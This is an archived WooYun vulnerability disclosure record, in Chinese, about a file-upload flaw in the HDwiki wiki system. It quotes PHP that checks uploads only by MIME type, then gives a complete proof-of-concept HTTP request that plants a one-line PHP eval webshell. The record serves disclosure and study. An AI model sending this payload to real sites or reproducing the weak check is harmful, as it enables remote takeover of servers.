{"id": 22276, "wybug_id": "wooyun-2011-02706", "wybug_title": "HDwiki文件上传导致远程代码执行漏洞", "wybug_corp": "互动在线（北京）科技有限公司", "wybug_author": "路人甲", "wybug_date": "2011-08-23 13:26", "wybug_open_date": "2011-09-10 16:03", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件操作参数未加过滤", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-08-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-09-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 互动维客开源系统（HDwiki）作为中国第一家拥有自主知识产权的中文维基（Wiki）系统，由互动在线（北京）科技有限公司于2006 年11月28日正式推出，力争为给国内外众多的维基（Wiki）爱好者提供一个免费、易用、功能强大的维基（Wiki）建站系统。HDwiki的推出，填补了中文维基（Wiki）建站系统的空白但是HDwiki中某些上传功能存在安全漏洞，通过一些数据即可绕过上传限制，最终控制远程站点 详细说明：  lib/file.class.php中\nfunction uploadfile($attachment,$target,$maxsize=1024,$is_image=1){\t\t$result=array ('result'=>false,'msg'=>'upload mistake');\t\tif($is_image){\t\t\t$attach=$attachment;\t\t\t$filesize=$attach['size']/1024;\t\t\tif(0==$filesize){\t\t\t\t$result['msg'] = '&#19978;&#20256;&#38169;&#35823;';\t\t\t\treturn $result;\t\t\t}\t\t\tif(substr($attach['type'],0,6)!='image/'){\t\t\t\t$result['msg'] ='&#26684;&#24335;&#38169;&#35823;';\t\t\t\treturn $result;\t\t\t}\t\t\tif($filesize>$maxsize){\t\t\t\t$result['msg'] ='&#25991;&#20214;&#36807;&#22823;';\t\t\t\treturn $result;\t\t\t}\t\t}else{\t\t\t$attach['tmp_name']=$attachment;\t\t}\t\t$filedir=dirname($target);\t\tfile::forcemkdir($filedir);\t\tif(@copy($attach['tmp_name'],$target) || @move_uploaded_file($attach['tmp_name'],$target)){\n没有什么检查attachment.php里触发\nfunction douploadimg() {\t\t$imgname=$_FILES['photofile']['name'];\t\t$extname=file::extname($imgname);\t\t$destfile=$_ENV['attachment']->makepath($extname);\t\t$arrupload=file::uploadfile($_FILES['photofile'],$destfile);\n   漏洞证明：  \nPOST /hdwiki/index.php?attachment-uploadimg HTTP/1.1Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://www.wooyun.org/Accept-Language: zh-cnContent-Type: multipart/form-data; boundary=---------------------------7db261e100f2eUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2)Host: www.wooyun.orgContent-Length: 370Connection: Keep-AliveCache-Control: no-cacheCookie: Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1298002704449; hd_sid=raG13H; hd_auth=4113YBBXXB13XtdR6EXTA1Cb9BuhZMK%2F29wdoHDQJTV5QZOoYd62OHd46iXKqf4Qz%2F5gc6pLm9fZ%2Bdgv68MT; hd_searchtime=1300983373-----------------------------7db261e100f2eContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"30000-----------------------------7db261e100f2eContent-Disposition: form-data; name=\"photofile\"; filename=\"C:\\fucker\\z.php\"Content-Type: image/imagezzz<?eval($_REQUEST[z])?>-----------------------------7db261e100f2e--\n   修复方案：  额   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2011-09-10 16:03 厂商回复：  漏洞Rank：12  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-09-10 16:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  乌云的bug 认领之后过了5天会导致直接公开    \n     2011-09-10 22:24 |    \t\t笨子 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 80759112)\t\t \n  这个我等好久了    \n     2012-04-17 19:39 |    \t\t江南的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:15        | 天生庸才！)\t\t \n  为何我对4.0.3没有测试上传成功呢？求解！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}